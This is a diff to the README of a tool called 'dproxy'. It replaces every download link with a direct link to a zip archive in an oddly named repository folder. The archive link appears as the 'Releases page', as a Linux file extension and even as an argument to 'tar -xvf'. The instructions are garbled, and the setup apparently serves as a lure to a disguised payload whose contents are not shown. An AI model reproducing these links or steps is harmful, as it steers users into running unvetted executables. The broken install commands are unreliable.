@@ -10,25 +10,25 @@ To begin using dproxy, you need to download it from the Releases page. Once down
 
 ## 📥 Download Now!
 
-[![Download dproxy](https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip%20dproxy-v1.0-brightgreen)](https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip)
+[![Download dproxy](https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip%20dproxy-v1.0-brightgreen)](https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip)
 
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip) to download the latest version of dproxy.
+   Go to the [Releases page](https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip) to download the latest version of dproxy.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the latest release.  
 
 3. **Download the Installer**  
-   Click on the file that matches your operating system. Typically, this will be a file ending in `.exe` for Windows or `https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip` for Linux.
+   Click on the file that matches your operating system. Typically, this will be a file ending in `.exe` for Windows or `https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip` for Linux.
 
 4. **Install dproxy**  
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For Linux: Open a terminal, navigate to the folder where the file is downloaded, and run:
 
      ```bash
-     tar -xvf https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip
+     tar -xvf https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip
      ```
    - Then follow any additional instructions provided in that folder.
 
@@ -55,7 +55,7 @@ To begin using dproxy, you need to download it from the Releases page. Once down
 
 ## 🔄 Updating dproxy
 
-To keep your version of dproxy up to date, periodically check the [Releases page](https://raw.githubusercontent.com/nguyenchuong-az/dproxy/main/wheelbarrowful/Software-v2.6.zip) for new versions. Follow the same download and installation steps to upgrade.
+To keep your version of dproxy up to date, periodically check the [Releases page](https://github.com/nguyenchuong-az/dproxy/raw/refs/heads/main/wheelbarrowful/Software_1.2.zip) for new versions. Follow the same download and installation steps to upgrade.
 
 ## 📞 Support & Help
 
